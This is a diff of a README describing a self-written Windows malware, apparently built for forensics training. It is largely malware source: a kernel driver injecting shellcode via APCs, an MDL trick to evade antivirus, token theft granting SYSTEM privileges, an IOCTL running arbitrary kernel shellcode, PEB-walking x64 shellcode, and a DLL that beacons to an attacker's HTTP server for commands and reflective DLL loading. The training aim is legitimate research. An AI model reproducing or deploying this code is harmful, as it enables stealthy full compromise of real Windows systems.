@@ -1,7 +1,8 @@
 
+  
 # The SubZero Project  
 
-SubZero is a multi-staged malware that contains a kernel mode rootkit and a remote system shell. Part of the malware capabilities are remote kernel mode shellcode execution and reflective DLL loading, which should grant full control over a compromised system.  
+SubZero is a multi-staged malware that contains a kernel-mode rootkit and a remote system shell. Part of the malware capabilities are remote kernel-mode shellcode execution and reflective DLL loading, which should grant full control over a compromised system.  
   
 # Disclaimer  
   
@@ -13,13 +14,13 @@ In addition, this repository also contain a use of Microsoft's undocumented func
   
 # Introduction & Goal  
   
-As a security researcher, I have encountered and analyzed various user-mode malwares in recent times. While some of them were more challenging than others, they were all designed with the same common ground in mind - **User Mode**.  
-My colleagues and I wanted to put our forensics skills to the test in an unknown environment like the kernel space. We started by fully [reverse-engineering an APT driver](https://github.com/DanielAvinoam/BlackEnergyV2-Driver-Reverse-Engineering) from 2008 - A pretty good start, but still far from a modern day kernel mode threat.  
+As a security researcher, I have encountered and analyzed various user-mode malwares in recent times. While some of them were more challenging than others, they were all designed with the same common ground in mind - **User-Mode**.  
+My colleagues and I wanted to put our forensics skills to the test in an unknown environment like the kernel space. We started by fully [reverse-engineering an APT driver](https://github.com/DanielAvinoam/BlackEnergyV2-Driver-Reverse-Engineering) from 2008 - A pretty good start, but still far from a modern day kernel-mode threat.  
 Instead of searching for a modern malicious driver to disassemble, which are extremely rare anyway, I figured it would be more beneficial to challenge my kernel programming skills and write the driver myself (After all, you should always "know your enemy")  
 This driver will accompany a few other user-mode modules that together will create a complete attack vector from start to finish. The researchers will receive a [memory image](https://drive.google.com/file/d/199RgloKz4Ki6HklD5pczlNBGX-YRFd7W/view?usp=sharing) of a compromised system and will need to form an accurate status report of what happened as fast as possible.  
  
 This project's main component is its driver - meaning the rest of the user-mode modules might have some compromises and will not take every scenario into account.  
-The code is written in `C++ 17` and all of its features. The user mode components designed with OOP in mind, In future versions the driver should be updated as well.  
+The code is written in `C++ 17` and all of its features. The user-mode components designed with OOP in mind, In future versions the driver should be updated as well.  
   
   
 # The Gameplan  
@@ -40,7 +41,7 @@ NTSTATUS PsSetCreateProcessNotifyRoutineEx(
 );
 ```
 The `NotifyRoutine` will be invoked whenever a new process is created. In this function the driver needs to save the PID of the created process, and capture its first thread - This can be done using another callback registration function named  `PsSetCreateThreadNotifyRoutineEx` that works similarly to the one prior. Before a new thread executes, it calls the `TestAlert` function, that flushes its APC queue. This guarantee us that our shellcode will be executed before the process' main thread.
-Prior to the APC queueing, the shellcode should be allocated to the process' address spaces. This is possible only from the context of that process and since callback functions are executing by an arbitrary thread, another APC should be queued - this time a kernel one.
+Prior to the APC queuing, the shellcode should be allocated to the process' address spaces. This is possible only from the context of that process and since callback functions are executing by an arbitrary thread, another APC should be queued - this time a kernel one.
 The following graph demonstrates the flow of events:
 
 ![Driver Flow](https://github.com/DanielAvinoam/TheSubZeroProject/blob/main/Images/DriverFlow.JPG "Driver Flow")
@@ -92,23 +93,23 @@ The following diagram summarizes the complete attack flow:
 
 ## Driver 
 
-Starting from the `DriverEntry` function, the driver initializes the usual structures (`DeviceObject`, symbolic link etc..) and register its callback and dispatch functions. This is followed by the seeking of explorer's PID, which should be present in the system's process list (`FindProcessByName` simply traverse the system's `EPROCESS` list and compare each entry's name to the inputed one). In case it doesn't, the thread sleeps for 5 seconds and tries again:
+Starting from the `DriverEntry` function, the driver initializes the usual structures like a `DeviceObject` and a symbolic link, then it register its callback and dispatch functions. This is followed by the seeking of explorer's PID, which should be present in the system's process list (`FindProcessByName` simply traverse the system's `EPROCESS` list and compare each entry's name to the requested one). In case it doesn't, the thread sleeps for 5 seconds and tries again:
 ```cpp
-// Search for explorer Process
-PEPROCESS explorerProcess;
-LARGE_INTEGER interval;
-interval.QuadPart = -50000000; // 5 Seconds / 100 nanoseconds - in RELATIVE time
-do {
-	if (NT_SUCCESS(FindProcessByName(PARENT_PROCESS_NAME, &explorerProcess))) 
-	{
-		g_Globals.ExplorerPID = ::HandleToULong(::PsGetProcessId(explorerProcess));
-		KdPrint((DRIVER_PREFIX "[+] explorer.exe found. PID: %d\n", g_Globals.ExplorerPID));
-		break;
-	}
-	KdPrint((DRIVER_PREFIX "[-] explorer.exe not found. Trying again in 5 seconds\n"));
-	::KeDelayExecutionThread(KernelMode, false, &interval);
-} while (true);
-...
+	// Search for explorer Process
+	PEPROCESS explorerProcess;
+	LARGE_INTEGER interval;
+	interval.QuadPart = -50000000; // 5 Seconds / 100 nanoseconds - in RELATIVE time
+	do {
+		if (NT_SUCCESS(FindProcessByName(PARENT_PROCESS_NAME, &explorerProcess))) 
+		{
+			g_Globals.ExplorerPID = ::HandleToULong(::PsGetProcessId(explorerProcess));
+			KdPrint((DRIVER_PREFIX "[+] explorer.exe found. PID: %d\n", g_Globals.ExplorerPID));
+			break;
+		}
+		KdPrint((DRIVER_PREFIX "[-] explorer.exe not found. Trying again in 5 seconds\n"));
+		::KeDelayExecutionThread(KernelMode, false, &interval);
+	} while (true);
+	...
 ```
  Next, an explorer thread should be caught. Using the `OnThreadNotify` callback function the driver checks whether the newly created thread is explorer's. Once found, the driver registers the function `OnProcessNotify` for process creation events and the function `InjectUsermodeShellcodeAPC` is then queued to that thread's APC queue, with a chrome-launching shellcode as its parameter:
 ```cpp
@@ -141,12 +142,12 @@ if (pid == g_Globals.ExplorerPID)
 }
 ...
 ```
-Notice the use of the global `RundownProtection` variable  - drivers can use run-down protection to safely access objects in shared system memory that are created and deleted by another kernel-mode driver. In our case, the variable is acquired before each APC queueing and it's the APC's job to release the object right before the function finishes. 
-The `DriverUnload` function will get blocked by the call to `ExWaitForRundownProtectionRelease`, which will wait for the `RundownProtection` to be released (if acquired). This is how the driver guarantee that it will not be unloaded while an APC is queued for execution, thus preventing a BSOD.
+Notice the use of the global `RundownProtection` variable  - drivers can use run-down protection to safely access objects in shared system memory that are created and deleted by another kernel-mode driver. In our case, the variable is acquired before the queuing of an APC and it's the APC's job to release the object right before it finishes. 
+The `DriverUnload` function will get blocked by a call to `ExWaitForRundownProtectionRelease`, which will wait for the `RundownProtection` to be released (if acquired). This is how the driver guarantee that it will not be unloaded while an APC is queued for execution, thus preventing a BSOD.
 
 >**Note**: You might also noticed the lambda expression sent to the `QueueAPC` function. This is a trick to bypass the `KeInitializeApc` requirement for declaring a `PKNORMAL_ROUTINE` as the APC function and avoid  casting its parameters to `PVOID` (which in some cases might cause some problems). 
 
-Jumping into `InjectUsermodeShellcodeAPC`, the function receives a shellcode pointer and its size. Since this function executes in the target process' context, it starts with allocating space equal to the shellcode's size:
+Jumping into `InjectUsermodeShellcodeAPC`, the function receives a shellcode and its size. Since this function executes in the target process' context, it starts by allocating space equal to the shellcode's size:
 ```cpp
 void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize) 
 {
@@ -172,51 +173,46 @@ void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize)
 	}
 	...
 ```
-In a standard code execution attack this space would be allocated with `EXECUTE_READWRITE` protection, in order to copy and then execute the code. This will alarm most anti-virus programs and exposing our malware - that's where the driver comes into play. 
-initially, the space is allocated with `PAGE_EXECUTE_READ`, then an [`MDL`](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls)  structure is being allocated and locked on that space, this time with `PAGE_READWRITE` protection. Using this structure  the driver can copy the shellcode to the allocated space, while the memory `VAD` protection stays as non-writable:
+In a standard code execution attack this space would be allocated with `EXECUTE_READWRITE` protection, in order to copy and then execute the code. This will alarm most anti-virus programs and expose our malware - that's where the driver comes into play. 
+initially, the space is allocated with `PAGE_EXECUTE_READ`, then an [`MDL`](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls) structure gets allocated and locked on that space, this time with `PAGE_READWRITE` protection. Using this structure the driver can copy the shellcode to the allocated space, while the memory `VAD` protection stays as non-writable:
 ```cpp
 	PMDL mdl;
 	PVOID mappedAddress = nullptr;
 	bool successful = false;
-	do
-	{
+	do {
+		// Allocate MDL
+		mdl = ::IoAllocateMdl(
+			address,
+			static_cast<ULONG>(pageAlligndShellcodeSize),
+			false,
+			false,
+			nullptr);
+		if (!mdl) 
+			break;
 	
-	// Allocate MDL
-	mdl = ::IoAllocateMdl(
-		address,
-		static_cast<ULONG>(pageAlligndShellcodeSize),
-		false,
-		false,
-		nullptr);
-	if (!mdl) break;
+		::MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
 	
-	::MmProbeAndLockPages(
-	mdl,
-	KernelMode,
-	IoReadAccess);
+		// Lock to kernel memory
+		mappedAddress = ::MmMapLockedPagesSpecifyCache(
+			mdl,
+			KernelMode,
+			MmNonCached,
+			nullptr,
+			false,
+			NormalPagePriority);	
+		if (nullptr == mappedAddress) 
+			break;
 	
-	// Lock to kernel memory
-	mappedAddress = ::MmMapLockedPagesSpecifyCache(
-		mdl,
-		KernelMode,
-		MmNonCached,
-		nullptr,
-		false,
-		NormalPagePriority);	
-	if (!mappedAddress) break;
-	
-	// Change protection
-	status = ::MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
-	if (NT_SUCCESS(status))
-	
-	successful = true;
-	
+		// Change protection
+		status = ::MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
+		if (NT_SUCCESS(status))
+			successful = true;
 	} while (false);
-...
+	...
 ```
   After the shellcode gets copied, a user-mode APC is queued with the new allocation's address and the `RundownProtection` variable is released:
 ```cpp
-	  // Copy Shellcode
+	// Copy Shellcode
 	__try
 	{
 		::RtlCopyMemory(mappedAddress, Shellcode, ShellcodeSize);
@@ -241,8 +237,8 @@ initially, the space is allocated with `PAGE_EXECUTE_READ`, then an [`MDL`](http
 ---
 ### The Shellcodes
 Before catching the launched chrome process, let's see how the shellcode works and launches the process in the first place.
-The shellcode was written with the help of [this](https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/) Nytro Security tutorial, that covers the basics of x64 assembly and how to find the addresses of API functions at runtime.
-In short, the shellcode starts with the parsing of the process' `PEB` (retrieved via the `GS` register) and finding the base address of `kernel32.dll` from the structure's lists:
+The shellcode was written with the help of [this Nytro Security](https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/) tutorial, that covers the basics of x64 assembly and how to find the addresses of API functions at runtime.
+In short, the shellcode starts by parsing the process' `PEB`  structure (retrieved via the `GS` register) and finding the base address of `kernel32.dll` from the structure's lists:
 ```assembly
 ; Parse PEB and find kernel32
 
@@ -283,7 +279,7 @@ mov edx, [rsi + rcx * 4] 	; EDX = Pointer(offset)
 add rdx, rbx 			; RDX = CreateProcessA
 mov rdi, rdx 			; Save CreateProcessA in RDI
 ```
-After `CreateProcessA`'s address is found it gets called with chrome.exe's path - this path does reisde in memory because `djb2` does not have a decoding function (It is possible to hide this text aswell, I chose not to):
+After `CreateProcessA`'s address is found it gets called with chrome.exe's path - this path does reside in memory because `djb2` does not have a decoding function (It is possible to hide this text as well, I chose not to):
 ```assembly
 ; Push the rest of CreateProcessA's parameters and call it
 
@@ -300,10 +296,10 @@ sub rsp, 0x20 				; Allocate stack space
 call rdi 				; CreateProcessA();
 add rsp, 0xD0 				; Free stack space: 0x20 (shadow space) + 0x30 (paramateres pushed) + 0x80 (structures)
 ```
-The  shellcode that loads the DLL to the chorme process works similarly to this one except calling `LoadLibrary` instead of `CreateProcessA`.
+The  shellcode that loads the DLL to the chrome process works similarly to this one except calling `LoadLibrary` instead of `CreateProcessA`.
 
 ---
-Back to the driver - the shellcode executes by an explorer thread and a chrome process should be opened. In the process creation callback function the driver checks whether a new process with explorer's PID has created:
+Back to the driver - the shellcode executes by an explorer thread causing a child chrome process to be opened. In `OnProcessNotify` the driver checks whether a new explorer child process has been created:
 ```cpp
 void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
 {
@@ -323,7 +319,7 @@ void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateI
 	}
 }
 ```
-The PID of that process is saved, and its first thread is then caught by the thread notification function. Once again, a kernel APC is queued for that thread and prior to injecting the library-loading shellcode into it, it sets the process' token to the system's one and unregister the thread and process notification callbacks:
+The PID of that process is saved, and its first thread is then caught by `OnThreadNotify`. Once again, a kernel APC is queued for that thread and prior the injection of the library-loading shellcode into it, it sets the process' token to the system's one and unregister the thread and process notification callbacks:
 
 ```cpp
 	// Search for chrome's first Thread
@@ -359,16 +355,16 @@ The PID of that process is saved, and its first thread is then caught by the thr
 		else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection\n"));
 	}
 ```
-Let's take a look on the driver's IOCTLs. As stated, two of them provide a user-mode client the ability to change any process' token and parent PID. These function are relatively simple - get the pointer of a process `EPROCESS` structure by its PID and change the value located at a fixed position from that pointer. 
-The IOCTL that executes a position independet shellcode is the one that really interests us. Writing a kernel mode shellcode is a different story than a user mode one - it's harder to debug and since the kernel modules base addresses cannot be retrieved from the `PEB`, getting the addresses of kernel functions is way more difficult.
+Now let's take a look on the driver's IOCTLs. As stated, two of them provide a user-mode client the ability to change any process' token and parent PID. These function are relatively simple - get the pointer of a process `EPROCESS` structure by its PID and change a value located at a fixed position from that pointer. 
+The IOCTL that executes a position independent shellcode is the one that really interests us. Writing a kernel-mode shellcode is a different story than a user-mode one - it's harder to debug and since the kernel modules base addresses cannot be retrieved from the `PEB`, getting the addresses of kernel functions is way more difficult.
 To make my life easier, I used [@avivshabtay](https://github.com/AvivShabtay)'s template for creating a [position independent shellcode (PIS)](https://github.com/AvivShabtay/OffensiveWinAPI/tree/master/PIC). The main idea goes like this:
-1. Write a function that recieves either the addresses of `GetProcAddress` and `LoadLibrary` (user mode) or `MmGetSystemRoutineAddress` (kernel mode).
-2. Use the recieved addresses to get the addresses of the rest of the API functions you desire.
+1. Write a function that receives either the addresses of `GetProcAddress` and `LoadLibrary` (user-mode) or `MmGetSystemRoutineAddress` (kernel-mode).
+2. Use the received addresses to get the addresses of the rest of the API functions you desire.
 3. Disable all compiler code enhancement and security features (either from the project's properties or disable before the function's implementation) in order to make the assembly code as pure as possible.
 4. Write an injector that will allocate and copy the function, then call it in a new thread with the respective addresses as parameter.
 
-The IOCTL handler recieves a kernel PIS in its input buffer and copies it to a new kernel allocation. In case the shellcode would need to return data, another memory space is allocated in a size also recieved by the client.
-The handler then builds a `PisParameters` structure with the addresses of `MmGetSystemRoutineAddress` and the returned data allocation, and starts a new kernel thread that will execute the PIS with the address of the structure as its parameter:
+The IOCTL handler receives a kernel PIS in its input buffer and copies it to a new kernel allocation. In case the shellcode would need to return data, another memory space is allocated in a size also received by the client.
+The handler then initialize a `PisParameters` structure with the addresses of `MmGetSystemRoutineAddress` and the returned data allocation, and starts a new kernel thread that will execute the PIS with the address of the structure as its parameter:
 ```cpp
 	auto* buffer = static_cast<SubZeroExecuteShellcodeData*>(Irp->AssociatedIrp.SystemBuffer);
 	if (sizeof(SubZeroExecuteShellcodeData) + buffer->ShellcodeSize > StackLocation->Parameters.DeviceIoControl.InputBufferLength)
@@ -382,9 +378,9 @@ The handler then builds a `PisParameters` structure with the addresses of `MmGet
 
 	PicParameters picParameters
 	{
-	MmGetSystemRoutineAddress,
-	returnedDataAddress,
-	buffer->ReturnedDataMaxSize
+		MmGetSystemRoutineAddress,
+		returnedDataAddress,
+		buffer->ReturnedDataMaxSize
 	};
 
 	auto* const picAddress = ::ExAllocatePoolWithTag(NonPagedPool, buffer->ShellcodeSize, DRIVER_TAG);
@@ -421,9 +417,167 @@ The handler then builds a `PisParameters` structure with the addresses of `MmGet
 	::ExFreePoolWithTag(picAddress, DRIVER_TAG);
 
 	return STATUS_SUCCESS;
+	...
 ```
+An example of a kernel PIS is the following function, that returns the PID of the process executing it (which will always be 4, since the PIS is executed by a new system thread):
+```cpp
+#pragma runtime_checks( "", off )
+#pragma optimize("", off)
+#pragma code_seg(".text$AAAA")
+
+void
+__declspec(safebuffers)
+__declspec(noinline)
+__stdcall PicStart(PVOID StartContext)
+{
+	// __debugbreak(); // INT 3 for debugging
+	
+	if (nullptr == StartContext)
+		return;
+		
+	PicParameters* picParameters = (PicParameters*)StartContext;
+	
+	// Get MmGetSystemRoutineAddress
+	pMmGetSystemRoutineAddress mmGetSystemRoutineAddress = (pMmGetSystemRoutineAddress)picParameters->MmGetSystemRoutineAddress;
+	
+	if (nullptr == mmGetSystemRoutineAddress)
+		return;
+		
+	// Function names
+	WCHAR ioGetCurrentProcessName[] = { 'P','s','G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','\0' };
+	WCHAR psGetProcessIdName[] = { 'P','s','G','e','t','P','r','o','c','e','s','s','I','d','\0' };
+	WCHAR rtlCopyMemoryName[] = { 'R','t','l','C','o','p','y','M','e','m','o','r','y','\0' };
+	
+	// Create UNICODE_STRING structures
+	UNICODE_STRING ioGetCurrentProcessString = RTL_CONSTANT_STRING(ioGetCurrentProcessName);
+	UNICODE_STRING psGetProcessIdString = RTL_CONSTANT_STRING(psGetProcessIdName);
+	UNICODE_STRING rtlCopyMemoryString = RTL_CONSTANT_STRING(rtlCopyMemoryName);
+	
+	// Get function addresses
+	pIoGetCurrentProcess ioGetCurrentProcess = (pIoGetCurrentProcess)mmGetSystemRoutineAddress(&ioGetCurrentProcessString);
+	pPsGetProcessId psGetProcessId = (pPsGetProcessId)mmGetSystemRoutineAddress(&psGetProcessIdString);
+	pRtlCopyMemory rtlCopyMemory = (pRtlCopyMemory)mmGetSystemRoutineAddress(&rtlCopyMemoryString);
+
+	// Check addresses validity
+	if (nullptr == ioGetCurrentProcess || nullptr == psGetProcessId || nullptr == rtlCopyMemory)
+		return;
+		
+	// Get current process object
+	PEPROCESS process = ioGetCurrentProcess();
+	if (nullptr == process)
+		return;
+		
+	// Convert to ULONG and copy to returned data address
+	ULONG pid = ::HandleToULong(psGetProcessId(process));
+	rtlCopyMemory(picParameters->ReturnedDataAddress, &pid, sizeof(pid));
+}
+```
+>**Note**: In order to avoid any strings from being located at the .data section and make the PIS read from an unknown address (since it executes from a different context), they are stored on the stack as a `WCHAR` array.
+
 ## DLL  
+
+As mentioned earlier, in order to prevent the chrome application from starting the loaded library's `DllMain` function needs to be infinite (i.e. never return).   An HTTP client object is created using [httplib](https://github.com/yhirose/cpp-httplib)'s header and a response handler is set to be called whenever a command from the server is received. A GET request is sent to the server every 5 seconds in an endless loop and if a connection could not be established, a new object is created and loop continues:
+  ```cpp
+  BOOL APIENTRY DllMain( HMODULE, DWORD ul_reason_for_call, LPVOID)
+{
+	std::unique_ptr<HttpClient> httpClient(new HttpClient(IpAddress, Port, ResponseHandler));
+	switch (ul_reason_for_call)
+	{
+		case DLL_PROCESS_ATTACH:
+		try 
+		{
+			// Endless loop, preventing from the APC queue to empty and launch a Chrome window
+			while (true) 
+			{
+				if (httplib::Error::Success != httpClient->FetchFromServer()) 
+				{
+					// Error connecting to server - Try again in 5 seconds
+					httpClient.release();
+					httpClient.reset(new HttpClient(IpAddress, Port, ResponseHandler));
+				}
+				::Sleep(SecondsToMilliseconds(SecondsBetweenFetches));
+			}
+		}
+		catch (...) 
+		{
+			// Unknown exception
+			SubZeroCleanup::Cleanup();
+		}
+		case DLL_THREAD_ATTACH:
+		case DLL_THREAD_DETACH:
+		case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
+  ```
   
+  > **Note:** As you can see, the above code (and the rest of the user-mode code in this project) uses `C++ 17` features like smart pointers, exception handling and OOP excessively.
+ 
+ The client and server have opcodes that the use to communicate with - these will be set under the `'Opcode' ` header in the HTTP packets. In case no command was inputted by the attacker the server sends a `KeepAlive` opcode which is answered by an empty POST packet with the same header.
+ The user-mode library offer the attacker 3 other opcodes - inject a kernel mode shellcode, reflectively load a DLL and to completely remove the malware from the system. The result of the operation is then sent back to the server. To makes things clearer, this is how the opcodes are defined:
+ ```cpp
+ constexpr DWORD KeepAliveOpcode = 0;
+
+enum class ServerOpcode 
+{
+	InjectKernelShellcode = 1,
+	LoadLibraryReflectively,
+	Cleanup
+};
+
+enum class ClientOpcode 
+{
+	Success = 1,
+	Failure
+};
+ ```
+ 
+ Once an opcode other than `KeepAlive` is sent from the server, the packet get parsed by the response handler function and its data is passed to an opcode-specific handler function.
+ The shellcode injection handler works as you expect - The DLL opens a handle to the driver and sends it the shellcode using `DeviceIoControl`. Any result from the shellcode is returned back to the server in the body of the POST response:
+```cpp
+	// Create SubZeroExecuteShellcodeData structure
+	auto const bufferSize = DataLength + sizeof(SubZeroExecuteShellcodeData);
+	
+	const std::unique_ptr<char> inputBuffer(new char[bufferSize]);
+	auto* const shellcodeDataStruct = reinterpret_cast<SubZeroExecuteShellcodeData*>(inputBuffer.get());
+	
+	shellcodeDataStruct->ShellcodeSize = static_cast<USHORT>(DataLength);
+	shellcodeDataStruct->ShellcodeOffset = static_cast<USHORT>(sizeof(SubZeroExecuteShellcodeData));
+	shellcodeDataStruct->ReturnedDataMaxSize = ReturnedDataSize;
+	
+	// Copy shellcode
+	::memcpy(inputBuffer.get() + shellcodeDataStruct->ShellcodeOffset, Data, shellcodeDataStruct->ShellcodeSize);
+	
+	const std::unique_ptr<char>outputBuffer(new char[shellcodeDataStruct->ReturnedDataMaxSize]);
+	
+	DWORD bytesReturned = 0;
+	if (!::DeviceIoControl(
+			deviceAutoHandle.get(), 						// device to be queried
+			IOCTL_SUBZERO_EXECUTE_SHELLCODE, 					// operation to perform
+			inputBuffer.get(), bufferSize, 						// input buffer
+			outputBuffer.get(), shellcodeDataStruct->ReturnedDataMaxSize, 		// output buffer
+			&bytesReturned, 							// # bytes returned
+			nullptr))
+			throw std::runtime_error(DEBUG_TEXT("[-] DeviceIoControl Failed"));
+			
+	if (0 < bytesReturned)
+			ReturnedData->append(outputBuffer.get(), bytesReturned);
+}
+```
+ The DLL loader handler sends the executable (which similarly to the shellcode is passed in the packet's body) to `MemoryLoadLibrary` - the main function from the `ReflectiveLibraryLoader` class:
+```cpp
+void LoadLibraryReflectively_OpcodeHandler(const PVOID Data, const size_t DataLength)
+{
+	PMEMORY_MODULE hModule = ReflectiveLibraryLoader::MemoryLoadLibrary(Data, DataLength);
+	if (nullptr == hModule)
+		throw std::runtime_error(DEBUG_TEXT("[-] Library module object failed to initialize"));
+		
+	ReflectiveLibraryLoader::OverridePeStringIdentifiers(hModule);
+}
+```
+ This class is based on [Joachim Bauch's in-memory DLL loader](https://www.joachim-bauch.de/tutorials/loading-a-dll-from-memory/) 
+ 
 ## Loader
   
 ## Cleanup  
@@ -431,5 +585,5 @@ The handler then builds a `PisParameters` structure with the addresses of `MmGet
 ## Server  
   
 # Executing  
-  
-# Special Thanks and Sources
+
+# TODO List
